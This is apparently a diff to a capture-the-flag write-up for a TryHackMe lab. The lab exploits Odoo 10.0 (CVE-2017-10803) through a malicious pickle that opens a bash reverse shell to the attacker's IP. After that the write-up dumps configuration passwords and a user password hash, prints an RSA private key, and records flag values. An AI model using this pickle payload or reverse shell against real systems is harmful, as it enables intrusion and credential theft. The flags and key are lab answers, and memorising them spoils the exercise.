@@ -428,7 +428,7 @@ import os
 
 class Exploit:
     def __reduce__(self):
-        return (list, ([os.system('bash -i >& /dev/tcp/10.201.100.220/443 0>&1')],))
+        return (list, ([os.system('bash -i >& /dev/tcp/10.81.91.142/4444 0>&1')],))
 
 with open('exploit.pickle', 'wb') as f:
     pickle.dump(Exploit(), f)
@@ -1483,4 +1483,804 @@ p.interactive()
 
 <br>
 <br>
+
+
+
+```bash
+admin@antisoft.thm  Administrator $pbkdf2-sha512$12000$lBJiDGHMOcc4Zwwh5Dzn/A$x.EZ/PrEodzEJ5r4JfQo2KsMZLkLT97xWZ3LsMdgwMuK1Ue.YCzfElODfWEGUOc7yYBB4fMt87ph8Sy5tN4nag
+```
+
+```bash
+ admin@antisoft.thm  Administrator $pbkdf2-sha512$12000$lBJiDGHMOcc4Zwwh5Dzn/A$x.EZ/PrEodzEJ5r4JfQo2KsMZLkLT97xWZ3LsMdgwMuK1Ue.YCzfElODfWEGUOc7yYBB4fMt87ph8Sy5tN4nag
+```
+
+```bash
+:~/Obscure/main_2026-02-08_14-32-57# cat Hash
+admin@antisoft.thm:$pbkdf2-sha512$12000$lBJiDGHMOcc4Zwwh5Dzn/A$x.EZ/PrEodzEJ5r4JfQo2KsMZLkLT97xWZ3LsMdgwMuK1Ue.YCzfElODfWEGUOc7yYBB4fMt87ph8Sy5tN4nag
+```
+
+```bash
+:~/Obscure/main_2026-02-08_14-32-57# echo '$pbkdf2-sha512$12000$lBJiDGHMOcc4Zwwh5Dzn/A$x.EZ/PrEodzEJ5r4JfQo2KsMZLkLT97xWZ3LsMdgwMuK1Ue.YCzfElODfWEGUOc7yYBB4fMt87ph8Sy5tN4nag' > Hash
+```
+
+```bash
+:~/Obscure/main_2026-02-08_14-32-57# ap install hashid
+```
+
+```bash
+:~/Obscure/main_2026-02-08_14-32-57# hashid --help
+usage: hashid.py [-h] [-e] [-m] [-j] [-o FILE] [--version] INPUT
+
+Identify the different types of hashes used to encrypt data
+
+positional arguments:
+  INPUT                    input to analyze (default: STDIN)
+
+options:
+  -e, --extended           list all possible hash algorithms including salted passwords
+  -m, --mode               show corresponding Hashcat mode in output
+  -j, --john               show corresponding JohnTheRipper format in output
+  -o FILE, --outfile FILE  write output to file
+  -h, --help               show this help message and exit
+  --version                show program's version number and exit
+
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+```
+
+```bash
+:~/Obscure/main_2026-02-08_14-32-57# john --list=formats | grep -i pbkdf2
+PBKDF2-HMAC-MD4, PBKDF2-HMAC-MD5, PBKDF2-HMAC-SHA1, PBKDF2-HMAC-SHA256, 
+PBKDF2-HMAC-SHA512, PDF, PEM, pfx, pgpdisk, pgpsda, pgpwde, phpass, PHPS, 
+oldoffice-opencl, PBKDF2-HMAC-MD4-opencl, PBKDF2-HMAC-MD5-opencl, 
+PBKDF2-HMAC-SHA1-opencl, rar-opencl, RAR5-opencl, TrueCrypt-opencl, 
+OpenBSD-SoftRAID-opencl, PBKDF2-HMAC-SHA256-opencl, 
+PBKDF2-HMAC-SHA512-opencl, pem-opencl, pfx-opencl, pgpdisk-opencl, 
+```
+
+```bash
+:~/Obscure/main_2026-02-08_14-32-57# hashid -m -j '$pbkdf2-sha512$12000$lBJiDGHMOcc4Zwwh5Dzn/A$x.EZ/PrEodzEJ5r4JfQo2KsMZLkLT97xWZ3LsMdgwMuK1Ue.YCzfElODfWEGUOc7yYBB4fMt87ph8Sy5tN4nag'
+Analyzing '$pbkdf2-sha512$12000$lBJiDGHMOcc4Zwwh5Dzn/A$x.EZ/PrEodzEJ5r4JfQo2KsMZLkLT97xWZ3LsMdgwMuK1Ue.YCzfElODfWEGUOc7yYBB4fMt87ph8Sy5tN4nag'
+[+] PBKDF2-SHA512(Generic) 
+```
+
+
+```bash
+:~/Obscure/main_2026-02-08_14-32-57# john --format=PBKDF2-HMAC-SHA512 --wordlist=/usr/share/wordlists/rockyou.txt Hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (HMAC-SHA224 [password is key, SHA224 256/256 AVX2 8x])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:17 DONE (2026-02-08 14:43) 0g/s 827683p/s 827683c/s 827683C/s !Sketchy!..*7¡Vamos!
+Session completed. 
+```
+
+
+```bash
+:~/Obscure# searchsploit Odoo 10.0
+--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                               |  Path
+--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Odoo CRM 10.0 - Code Execution                                                                                                               | linux/local/44064.md
+--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+
+```bash
+root@ip-10-81-91-142:~/Obscure# searchsploit -m linux/local/44064.md
+  Exploit: Odoo CRM 10.0 - Code Execution
+      URL: https://www.exploit-db.com/exploits/44064
+     Path: /opt/exploitdb/exploits/linux/local/44064.md
+    Codes: CVE-2017-10803
+ Verified: False
+File Type: Python script, UTF-8 Unicode text executable, with very long lines
+Copied to: /root/Obscure/44064.md
+```
+
+```bash
+root@ip-10-81-91-142:~/Obscure# ls
+44064.md  exploit.py  main_2026-02-08_14-32-57  main_2026-02-08_14-32-57.zip  notice.txt  password  spassword
+root@ip-10-81-91-142:~/Obscure# cat 44064.md
+## Vulnerability Summary
+The following advisory describe arbitrary Python code execution found in Odoo CRM version 10.0
+
+Odoo is a suite of open source business apps that cover all your company needs: CRM, eCommerce, accounting, inventory, point of sale, project management, etc. Odoo\u2019s unique value proposition is to be at the same time very easy to use and fully integrated.
+
+## Credit
+An independent security researcher has reported this vulnerability to Beyond Security\u2019s SecuriTeam Secure Disclosure program.
+
+## Vendor response
+Odoo has done a private disclosure for the issue we reported, and the patch was merged in all supported branches.
+CVE: CVE-2017-10803
+
+The full public disclosure will be available at https://github.com/odoo/odoo/issues/17898.
+
+## Vulnerability Details
+One of the core Odoo modules, Database Anonymization, allows an administrator to anonymize the contents of the Odoo database. The module does this by serializing the contents of the existing database using Python\u2019s pickle module into a backup file before modifying the contents of the database. The administrator can then de-anonymize the database by loading the pickled backup file.
+
+Python\u2019s pickle module can be made to execute arbitrary Python code when loading an attacker controlled pickle file. With this, an administrator can execute arbitrary Python code with the same privilege level as the Odoo webapp by anonymizing the database then attempt the de-anonymization process with a crafted pickle file.
+
+## Proof of Concept
+In order to exploit the vulnerability, you should navigate to the Apps page (the link is in the navigation bar at the top and search for and install \u201cDatabase Anonymization\u201d in the search bar. We have to deselect the \u201cApps\u201d filter in the search bar for it to show up.
+
+Once we have the module installed, we navigate to the settings page and select \u201cAnonymize database\u201d under \u201cDatabase anonymization\u201d and click on the \u201cAnonymize Database\u201d button. Next, we refresh the page and navigate to the same page under settings. We upload the \u201cexploit.pickle\u201d file generated our script and click on \u201cReverse the Database Anonymization\u201d button. We should have a reverse shell.
+
+The following Python file generate a malicious pickle file that attempts (via bash) to connect back to a listener on port 8000:
+
+
+import cPickle
+import os
+import base64
+import pickletools
+
+class Exploit(object):
+def __reduce__(self):
+return (os.system, (("bash -i >& /dev/tcp/127.0.0.1/8000 0>&1"),))
+
+with open("exploit.pickle", "wb") as f:
+cPickle.dump(Exploit(), f, cPickle.HIGHEST_PROTOCOL)
+
+
+We then use netcat listener on port 8000:
+
+
+ncat -nlvp 8000
+
+```
+
+<p>
+
+- Disable <strong>Apps</strong> in the <strong>Search</strong> field<br>
+- Search for <strong>Database</strong><br>
+- Click <strong>Install</strong> on <strong>Database Anonymization</strong></p>
+
+
+<img width="1105" height="272" alt="image" src="https://github.com/user-attachments/assets/c4e5c851-aa34-4267-88a4-c707e8546a8e" />
+
+<br>
+<br>
+<p>
+
+- Navigate to <strong>Settings</strong></p>
+
+<img width="1084" height="137" alt="image" src="https://github.com/user-attachments/assets/897909aa-68cf-43ae-8da1-15a843d32c2d" />
+
+<br>
+<br>
+<p>
+
+- Click <strong>Anonymize database</strong><br>
+- Click <strong>Anonymize database</strong></p>
+
+
+<img width="1102" height="490" alt="image" src="https://github.com/user-attachments/assets/4f01056f-d6e2-47e4-9df4-c8bb0435054c" />
+
+<img width="1008" height="448" alt="image" src="https://github.com/user-attachments/assets/5b351e08-6ae0-44ad-87be-8df7448d7766" />
+
+<br>
+<br>
+<p>
+
+- Refresh</p>
+
+<img width="1097" height="436" alt="image" src="https://github.com/user-attachments/assets/7de20d95-200d-4a99-9638-45c3eb2a20cd" />
+
+<br>
+<br>
+<p>
+
+- Click <strong>Upload your file</strong><br>
+- Browse, Select <conde>exploit.pickle</code> and click <strong>Open</strong></p>
+
+<img width="1101" height="423" alt="image" src="https://github.com/user-attachments/assets/1f57a968-e23b-4e76-bb4f-54d308dd4b07" />
+
+<br>
+<br>
+
+
+import pickle
+import os
+import base64
+
+class Exploit(object):
+    def __reduce__(self):
+        # Python 2.7 friendly system call
+        cmd = "bash -c 'bash -i >& /dev/tcp/10.81.91.142/4444 0>&1'"
+        return (os.system, (cmd,))
+
+# protocol=0 creates an ASCII-only pickle, which is the most stable for Python 2.7
+payload = pickle.dumps(Exploit(), protocol=0)
+
+# 1. Print the string for your reference
+print("Base64 Payload: " + base64.b64encode(payload).decode())
+
+# 2. Automatically save the file to your current folder
+with open('exploit.pickle', 'wb') as f:
+    f.write(payload)
+
+print("\nSuccess! 'exploit.pickle' has been generated in your current directory.")
+
+
+
+
+
+
+:~/Obscure# nano c.py
+
+
+:~/Obscure# python3 c.py
+Base64 Payload: Y3Bvc2l4CnN5c3RlbQpwMAooVmJhc2ggLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuODEuOTEuMTQyLzQ0NDQgMD4mMScKcDEKdHAyClJwMwou
+
+Success! 'exploit.pickle' has been generated in your current directory.
+
+
+
+:~/Obscure# cat exploit.pickle
+gASVTwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDRiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjgxLjkxLjE0Mi80NDQ0IDA+JjEnlIWUUpQu
+
+
+<p>
+
+- Upload<br>
+- Click <strong>Save</strong></p>
+
+<img width="1101" height="492" alt="image" src="https://github.com/user-attachments/assets/cd2a928a-ed1e-4932-a423-b182097022c9" />
+
+
+<img width="1102" height="458" alt="image" src="https://github.com/user-attachments/assets/2a8f4fcc-973d-4dc9-88d5-38a0fb3f8284" />
+
+
+<br>
+<br>
+<p>
+
+- Click <strong>Save</strong></p>
+
+
+<img width="1100" height="480" alt="image" src="https://github.com/user-attachments/assets/10a34675-618c-4b30-9be3-5b4e4ab92dea" />
+
+<br>
+<br>
+<p>
+
+- Click the <strong>Reverse the Database Anonymization</strong></p>
+
+<img width="1106" height="588" alt="image" src="https://github.com/user-attachments/assets/351a7196-6e16-493f-ba6d-cdb960526229" />
+
+<br>
+<br>
+
+
+<p>
+
+- Click <strong>Create</strong></p>
+
+<img width="1105" height="443" alt="image" src="https://github.com/user-attachments/assets/fdb95465-a45d-4619-be53-22ee28073a02" />
+
+<p>
+
+- check your listener</strong></p>
+
+
+<img width="1109" height="248" alt="image" src="https://github.com/user-attachments/assets/1760187c-b952-4ef0-8f42-b71e0dacb8ef" />
+
+
+odoo@b8a9bbf1f380:~$ ^Z
+[1]+  Stopped                 nc -nlvp 4444
+root@ip-10-81-91-142:~/Obscure# stty raw -echo; fg
+nc -nlvp 4444
+
+odoo@b8a9bbf1f380:~$ export TERM=xterm
+
+
+
+odoo@b8a9bbf1f380:~$ pwd
+pwd
+/var/lib/odoo
+odoo@b8a9bbf1f380:~$ ls -lah
+ls -lah
+total 892K
+drwxr-xr-x 5 odoo odoo 4.0K Feb 22  2023 .
+drwxr-xr-x 1 root root 4.0K Oct 17  2019 ..
+lrwxrwxrwx 1 root root    9 Feb 22  2023 .bash_history -> /dev/null
+drwx------ 3 odoo odoo 4.0K Jul 23  2022 addons
+-rw-r--r-- 1 odoo odoo 1.4K Feb  8 15:16 field_anonymization_main_1.pickle
+drwxr-xr-x 3 odoo odoo 4.0K Jul 23  2022 filestore
+-rw-r--r-- 1 root root   38 Feb 22  2023 flag.txt
+drwx------ 2 odoo odoo 864K Feb  8 15:22 sessions
+odoo@b8a9bbf1f380:~$ cat flag.txt
+cat flag.txt
+THM{1243b64a3a01a8732ccb96217f593520}
+odoo@b8a9bbf1f380:~$ 
+
+
+<img width="1102" height="306" alt="image" src="https://github.com/user-attachments/assets/c28eab12-5acc-49dd-ab19-30d02028f17c" />
+
+
+
+
+
+odoo@b8a9bbf1f380:/$ find / -perm -4000 -ls 2>/dev/null
+156001   40 -rwsr-xr-x   1 root     root        40000 Mar 29  2015 /bin/mount
+156039   28 -rwsr-xr-x   1 root     root        27416 Mar 29  2015 /bin/umount
+156006   44 -rwsr-xr-x   1 root     root        44104 Nov  8  2014 /bin/ping
+156007   44 -rwsr-xr-x   1 root     root        44552 Nov  8  2014 /bin/ping6
+156022   40 -rwsr-xr-x   1 root     root        40168 May 17  2017 /bin/su
+142767  456 -rwsr-xr-x   1 root     root       464904 Mar 25  2019 /usr/lib/openssh/ssh-keysign
+156958   40 -rwsr-xr-x   1 root     root        39912 May 17  2017 /usr/bin/newgrp
+156863   44 -rwsr-xr-x   1 root     root        44464 May 17  2017 /usr/bin/chsh
+156861   56 -rwsr-xr-x   1 root     root        53616 May 17  2017 /usr/bin/chfn
+156909   76 -rwsr-xr-x   1 root     root        75376 May 17  2017 /usr/bin/gpasswd
+156970   56 -rwsr-xr-x   1 root     root        54192 May 17  2017 /usr/bin/passwd
+ 10150   12 -rwsr-xr-x   1 root     root         8864 Jul 23  2022 /ret
+odoo@b8a9bbf1f380:/$ ls -lah
+total 88K
+drwxr-xr-x   1 root root 4.0K Jul 26  2022 .
+drwxr-xr-x   1 root root 4.0K Jul 26  2022 ..
+-rwxr-xr-x   1 root root    0 Jul 23  2022 .dockerenv
+drwxr-xr-x   1 root root 4.0K Jul 23  2022 bin
+drwxr-xr-x   2 root root 4.0K Jun 14  2018 boot
+drwxr-xr-x   5 root root  340 Feb  8 14:04 dev
+-rwxrwxr-x   1 root root 1.1K Oct 17  2019 entrypoint.sh
+drwxr-xr-x   1 root root 4.0K Jul 23  2022 etc
+drwxr-xr-x   2 root root 4.0K Jun 14  2018 home
+drwxr-xr-x   1 root root 4.0K Oct 17  2019 lib
+drwxr-xr-x   2 root root 4.0K Oct 14  2019 lib64
+drwxr-xr-x   2 root root 4.0K Oct 14  2019 media
+drwxr-xr-x   1 root root 4.0K Oct 17  2019 mnt
+drwxr-xr-x   2 root root 4.0K Oct 14  2019 opt
+dr-xr-xr-x 136 root root    0 Feb  8 14:04 proc
+-rwsr-xr-x   1 root root 8.7K Jul 23  2022 ret
+drwx------   1 root root 4.0K Jul 23  2022 root
+drwxr-xr-x   1 root root 4.0K Oct 17  2019 run
+drwxr-xr-x   1 root root 4.0K Oct 17  2019 sbin
+drwxr-xr-x   2 root root 4.0K Oct 14  2019 srv
+dr-xr-xr-x  13 root root    0 Feb  8 14:04 sys
+drwxrwxrwt   1 root root 4.0K Feb  8 14:33 tmp
+drwxr-xr-x   1 root root 4.0K Oct 14  2019 usr
+drwxr-xr-x   1 root root 4.0K Oct 14  2019 var
+odoo@b8a9bbf1f380:/$ cat entrypoint.sh
+#!/bin/bash
+
+set -e
+
+# set the postgres database host, port, user and password according to the environment
+# and pass them as arguments to the odoo process if not present in the config file
+: ${HOST:=${DB_PORT_5432_TCP_ADDR:='db'}}
+: ${PORT:=${DB_PORT_5432_TCP_PORT:=5432}}
+: ${USER:=${DB_ENV_POSTGRES_USER:=${POSTGRES_USER:='odoo'}}}
+: ${PASSWORD:=${DB_ENV_POSTGRES_PASSWORD:=${POSTGRES_PASSWORD:='odoo'}}}
+
+DB_ARGS=()
+function check_config() {
+    param="$1"
+    value="$2"
+    if ! grep -q -E "^\s*\b${param}\b\s*=" "$ODOO_RC" ; then
+        DB_ARGS+=("--${param}")
+        DB_ARGS+=("${value}")
+   fi;
+}
+check_config "db_host" "$HOST"
+check_config "db_port" "$PORT"
+check_config "db_user" "$USER"
+check_config "db_password" "$PASSWORD"
+
+case "$1" in
+    -- | odoo)
+        shift
+        if [[ "$1" == "scaffold" ]] ; then
+            exec odoo "$@"
+        else
+            exec odoo "$@" "${DB_ARGS[@]}"
+        fi
+        ;;
+    -*)
+        exec odoo "$@" "${DB_ARGS[@]}"
+        ;;
+    *)
+        exec "$@"
+esac
+
+exit 1
+
+
+
+db =
+Port: 5432
+User: oddo
+Password: oddo
+
+
+
+
+odoo@b8a9bbf1f380:/$ find /etc/ -name "*.conf" 2>/dev/null | grep odoo
+/etc/odoo/odoo.conf
+odoo@b8a9bbf1f380:/$ cat /etc/odoo/odoo.conf
+[options]
+addons_path = /mnt/extra-addons,/usr/lib/python2.7/dist-packages/odoo/addons
+admin_passwd = SecurePassword123!
+csv_internal_sep = ,
+data_dir = /var/lib/odoo
+db_host = 172.17.0.2
+db_maxconn = 64
+db_name = False
+db_password = unkkuri-secret-pw
+db_port = 5432
+db_template = template1
+db_user = odoo
+dbfilter = .*
+demo = {}
+email_from = False
+geoip_database = /usr/share/GeoIP/GeoLite2-City.mmdb
+import_partial = 
+limit_memory_hard = 2684354560
+limit_memory_soft = 2147483648
+limit_request = 8192
+limit_time_cpu = 60
+limit_time_real = 120
+limit_time_real_cron = -1
+list_db = True
+log_db = False
+log_db_level = warning
+log_handler = :INFO
+log_level = info
+logfile = None
+logrotate = False
+longpolling_port = 8072
+max_cron_threads = 2
+osv_memory_age_limit = 1.0
+osv_memory_count_limit = False
+pg_path = None
+pidfile = None
+proxy_mode = False
+reportgz = False
+server_wide_modules = web,web_kanban
+smtp_password = False
+smtp_port = 25
+smtp_server = localhost
+smtp_ssl = False
+smtp_user = False
+syslog = False
+test_commit = False
+test_enable = False
+test_file = False
+test_report_directory = False
+translate_modules = ['all']
+unaccent = False
+without_demo = False
+workers = 0
+xmlrpc = True
+xmlrpc_interface = 
+xmlrpc_port = 8069
+
+odoo@b8a9bbf1f380:/$ 
+
+
+
+
+
+
+
+Host: 172.17.0.2
+
+User: odoo
+
+Password: unkkuri-secret-pw
+
+Admin/Master Password: SecurePassword123!
+
+
+
+
+
+odoo@b8a9bbf1f380:/$ psql -h 172.17.0.2 -U odoo -d main
+Password for user odoo: 
+psql (11.5 (Debian 11.5-3.pgdg80+1), server 9.4.26)
+Type "help" for help.
+
+main=# \l
+                             List of databases
+   Name    | Owner | Encoding |  Collate   |   Ctype    | Access privileges 
+-----------+-------+----------+------------+------------+-------------------
+ main      | odoo  | UTF8     | en_US.utf8 | en_US.utf8 | 
+ postgres  | odoo  | UTF8     | en_US.utf8 | en_US.utf8 | 
+ template0 | odoo  | UTF8     | en_US.utf8 | en_US.utf8 | =c/odoo          +
+           |       |          |            |            | odoo=CTc/odoo
+ template1 | odoo  | UTF8     | en_US.utf8 | en_US.utf8 | =c/odoo          +
+           |       |          |            |            | odoo=CTc/odoo
+(4 rows)
+
+main=# \dt
+                           List of relations
+ Schema |                     Name                      | Type  | Owner 
+--------+-----------------------------------------------+-------+-------
+ public | anonymized_field_to_history_rel               | table | odoo
+ public | base_import_import                            | table | odoo
+ public | base_import_tests_models_char                 | table | odoo
+ public | base_import_tests_models_char_noreadonly      | table | odoo
+ public | base_import_tests_models_char_readonly        | table | odoo
+ public | base_import_tests_models_char_required        | table | odoo
+ public | base_import_tests_models_char_states          | table | odoo
+ public | base_import_tests_models_char_stillreadonly   | table | odoo
+ public | base_import_tests_models_m2o                  | table | odoo
+ public | base_import_tests_models_m2o_related          | table | odoo
+ public | base_import_tests_models_m2o_required         | table | odoo
+ public | base_import_tests_models_m2o_required_related | table | odoo
+ public | base_import_tests_models_o2m                  | table | odoo
+ public | base_import_tests_models_o2m_child            | table | odoo
+ public | base_import_tests_models_preview              | table | odoo
+ public | base_language_export                          | table | odoo
+ public | base_language_import                          | table | odoo
+ public | base_language_install                         | table | odoo
+ public | base_module_configuration                     | table | odoo
+ public | base_module_update                            | table | odoo
+ public | base_module_upgrade                           | table | odoo
+ public | base_update_translations                      | table | odoo
+ public | change_password_user                          | table | odoo
+ public | change_password_wizard                        | table | odoo
+ public | ir_act_client                                 | table | odoo
+ public | ir_act_report_xml                             | table | odoo
+ public | ir_act_server                                 | table | odoo
+ public | ir_act_url                                    | table | odoo
+ public | ir_act_window                                 | table | odoo
+ public | ir_act_window_group_rel                       | table | odoo
+ public | ir_act_window_view                            | table | odoo
+ public | ir_actions                                    | table | odoo
+ public | ir_actions_todo                               | table | odoo
+ public | ir_attachment                                 | table | odoo
+ public | ir_config_parameter                           | table | odoo
+ public | ir_config_parameter_groups_rel                | table | odoo
+ public | ir_cron                                       | table | odoo
+ public | ir_exports                                    | table | odoo
+ public | ir_exports_line                               | table | odoo
+ public | ir_filters                                    | table | odoo
+ public | ir_logging                                    | table | odoo
+ public | ir_mail_server                                | table | odoo
+ public | ir_model                                      | table | odoo
+ public | ir_model_access                               | table | odoo
+ public | ir_model_constraint                           | table | odoo
+ public | ir_model_data                                 | table | odoo
+ public | ir_model_fields                               | table | odoo
+ public | ir_model_fields_anonymization                 | table | odoo
+ public | ir_model_fields_anonymization_history         | table | odoo
+ public | ir_model_fields_anonymization_migration_fix   | table | odoo
+ public | ir_model_fields_anonymize_wizard              | table | odoo
+ public | ir_model_fields_group_rel                     | table | odoo
+ public | ir_model_relation                             | table | odoo
+ public | ir_module_category                            | table | odoo
+ public | ir_module_module                              | table | odoo
+ public | ir_module_module_dependency                   | table | odoo
+ public | ir_property                                   | table | odoo
+ public | ir_rule                                       | table | odoo
+ public | ir_sequence                                   | table | odoo
+ public | ir_sequence_date_range                        | table | odoo
+ public | ir_server_object_lines                        | table | odoo
+ public | ir_translation                                | table | odoo
+ public | ir_ui_menu                                    | table | odoo
+ public | ir_ui_menu_group_rel                          | table | odoo
+ public | ir_ui_view                                    | table | odoo
+ public | ir_ui_view_custom                             | table | odoo
+ public | ir_ui_view_group_rel                          | table | odoo
+ public | ir_values                                     | table | odoo
+ public | rel_modules_langexport                        | table | odoo
+ public | rel_server_actions                            | table | odoo
+ public | res_bank                                      | table | odoo
+ public | res_company                                   | table | odoo
+ public | res_company_users_rel                         | table | odoo
+ public | res_config                                    | table | odoo
+ public | res_config_installer                          | table | odoo
+ public | res_config_settings                           | table | odoo
+ public | res_country                                   | table | odoo
+ public | res_country_group                             | table | odoo
+ public | res_country_res_country_group_rel             | table | odoo
+ public | res_country_state                             | table | odoo
+ public | res_currency                                  | table | odoo
+ public | res_currency_rate                             | table | odoo
+ public | res_font                                      | table | odoo
+ public | res_groups                                    | table | odoo
+ public | res_groups_action_rel                         | table | odoo
+ public | res_groups_implied_rel                        | table | odoo
+ public | res_groups_report_rel                         | table | odoo
+ public | res_groups_users_rel                          | table | odoo
+ public | res_lang                                      | table | odoo
+ public | res_partner                                   | table | odoo
+ public | res_partner_bank                              | table | odoo
+ public | res_partner_category                          | table | odoo
+ public | res_partner_res_partner_category_rel          | table | odoo
+ public | res_partner_title                             | table | odoo
+ public | res_request_link                              | table | odoo
+ public | res_users                                     | table | odoo
+ public | res_users_log                                 | table | odoo
+ public | rule_group_rel                                | table | odoo
+ public | web_editor_converter_test                     | table | odoo
+ public | web_editor_converter_test_sub                 | table | odoo
+ public | web_planner                                   | table | odoo
+ public | web_tour_tour                                 | table | odoo
+ public | wizard_ir_model_menu_create                   | table | odoo
+ public | wkf                                           | table | odoo
+ public | wkf_activity                                  | table | odoo
+ public | wkf_instance                                  | table | odoo
+ public | wkf_transition                                | table | odoo
+ public | wkf_triggers                                  | table | odoo
+ public | wkf_witm_trans                                | table | odoo
+ public | wkf_workitem                                  | table | odoo
+(110 rows)
+
+
+
+
+main=# \d res_users
+                                          Table "public.res_users"
+     Column     |            Type             | Collation | Nullable |          
+      Default                
+----------------+-----------------------------+-----------+----------+----------
+-----------------------------
+ id             | integer                     |           | not null | nextval('
+res_users_id_seq'::regclass)
+ active         | boolean                     |           |          | true
+ login          | character varying           |           | not null | 
+ password       | character varying           |           |          | NULL::cha
+racter varying
+ company_id     | integer                     |           | not null | 
+ partner_id     | integer                     |           | not null | 
+ create_date    | timestamp without time zone |           |          | 
+ share          | boolean                     |           |          | 
+ write_uid      | integer                     |           |          | 
+ create_uid     | integer                     |           |          | 
+ action_id      | integer                     |           |          | 
+ write_date     | timestamp without time zone |           |          | 
+ signature      | text                        |           |          | 
+ password_crypt | character varying           |           |          | 
+...
+
+
+
+main=# SELECT login, password, password_crypt FROM res_users;
+       login        | password |                                                
+           password_crypt                                                       
+    
+--------------------+----------+------------------------------------------------
+--------------------------------------------------------------------------------
+----
+ default            |          | 
+ public             |          | 
+ admin@antisoft.thm |          | $pbkdf2-sha512$12000$lBJiDGHMOcc4Zwwh5Dzn/A$x.E
+Z/PrEodzEJ5r4JfQo2KsMZLkLT97xWZ3LsMdgwMuK1Ue.YCzfElODfWEGUOc7yYBB4fMt87ph8Sy5tN4
+nag
+(3 rows)
+
+main=# 
+
+
+
+main=# SELECT key, value FROM ir_config_parameter;
+         key          |                value                 
+----------------------+--------------------------------------
+ database.secret      | 812560d9-caa9-49fd-9986-ab3d6741a9f7
+ database.create_date | 2022-07-23 10:51:18
+ database.uuid        | 61fc1abe-0a75-11ed-b7ad-0242ac110003
+ web.base.url         | http://antisoft.thm
+(4 rows)
+
+main=# 
+
+
+
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEAxuNhK456dD+WXwoMLkfzQPvBsbnN27Aq8NfCVp4625XyoXi+
+i2g2nYNOarOGX+/q/M0UmoObiaJOPLLig9oFm8ZPxHtmVgOTX2Go1pDWotEHZHL3
+GdQ+W8lkg+h/X2C5WwlqUjcQxBuPsMgvZB4W714u5FpFOhiKtMwh20VX8AcwptJ8
+ET4m79e+lChbPJqsQZcmtKkjzWhlIimfZWhYHca7DtljYpQf4+uVIle6diy5xot7
+lxNniPc9v1y1YFSHYrFfFYmlnniWnBrVhXBw0sydJTnISxvI1p7pw4vMZX441oHb
+FNsC+oCtW36HPEprpySilvIzdv1d8N56cW6BZQIDAQABAoIBAQCnb6NNbPxwQ1wP
+lMDecZo7Wfcd7UN+MJhl++5Sx5Dbbig+gg1ABbL89h8dOxfkSnG0893lmuhlfWuK
+NDr4L6LLGq/qxMxJm2cFRI1EXdkkZv9nNFYMu57n3OsvFZutqxtApfOJVWxa/K0C
+cfVbvu0mBU9K1Sg0mZakULosA/vdSGQGXdyS1UmDNSLbfnffyccdk+TiB0mnKpp5
+JfE3yML08AJYruEG7ZoNMM170RFtE40al1aox7X9fxe434+sTlBHWXNf+FkHTO8O
+gQRQZKEDA2mMpUflMDRSyRjmoZfap7i9LCea4U7jlUeFH13ex3Sgbj6zOeIKMpCq
+XBUKaSmhAoGBAOut6/PntcLUJns9oF1I6a4+343Au+Trx3UGeQCXOwIb1WhAXBH4
+OvKZEK0qb76MANTU3VdqLXXLwharMd/AyXYX0cXObVQ7FWWF318+3JgVU7q65yx1
+11+ZCIaRJfJDEjvbroEvD9xbPcDj3naYaJyqc2mV9OPov8cqAe8PZ+dZAoGBANgJ
+YKRJUSyNP2E5xENkaUvQ+OODN4cwMO0yB4QAbFfSvZiR1vVllbgWlQQciAm7WY4j
+ovQGrC6/tBr2ylza7hYFq3mNb1vvvKOZSr8x/FYhvoSpA4vMxDFmGM8Fc/gd3guv
+LSPPP5nM1GBbgydL3rY5ZIhwCOQOj2ymqoKQkXTtAoGALFgGHFdNqMHYF7opsUOl
+zEZCM96+u7ztQ4SbQdQyoxvvlHT/ndXx6XGJZLumWNjo0yLWHrt4oEBdXXyKnsoc
+Xd7vdmN3yLBxPy/oLniacvcYUPsXwhLOGkumAgPPevzJsn+MHvxm5JQ6U0/MrM3S
+aR/dJVG0ySki5Gtv/7YLW8kCgYEAhKCtLe684OcOI/g830rDwgHW6oXiDyKsxtHR
+/13rJbeBIitWlmz5D3z9mvqRIbhc8IA8SCfYiRKz1WHxNjRJukdc0FDeLsjtPFqd
+oudjDNXGitbgEHFzeQg+7slgOtDLQs0Wn0daumcfctB7oiJX5fMyHvj43Fl7/64K
+PAHY6rkCgYEAsVk6DjjzRQCAMoyC9H4bwAWMkvYerSkmvIo3efCMyUdKtMjg3cCv
+EFmGDkEL3l6/2W3bmF6kbYDOeSyRjAaZp59QUiNliiHneD9VwCVXT/IF70O+kNkf
+c7FgDFMEoa44S7BZIhxymHyGN7xgPQ6EJonUuMCfmP83KLRZrkI4FPI=
+-----END RSA PRIVATE KEY-----
+
+
+
+:~/Obscure# ssh -i id_rsa zeeshan@antisoft.thm
+The authenticity of host 'antisoft.thm (10.81.150.153)' can't be established.
+ECDSA key fingerprint is SHA256:f+is3cC+YlqS/Bwb1ud77WigsaSFBDdDbOmD9WIaCv4.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'antisoft.thm,10.81.150.153' (ECDSA) to the list of known hosts.
+Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+UA Infra: Extended Security Maintenance (ESM) is not enabled.
+
+0 updates can be applied immediately.
+
+195 additional security updates can be applied with UA Infra: ESM
+Learn more about enabling UA Infra: ESM service for Ubuntu 16.04 at
+https://ubuntu.com/16-04
+
+
+Last login: Sun Apr 30 20:34:56 2023 from 192.168.100.3
+zeeshan@hydra:~$ 
+
+
+
+zeeshan@hydra:~$ cat user.txt
+THM{43b0b68ba2755dd6cac3b8bf5454db94}
+
+
+
+zeeshan@hydra:~$ getent hosts
+127.0.0.1       localhost
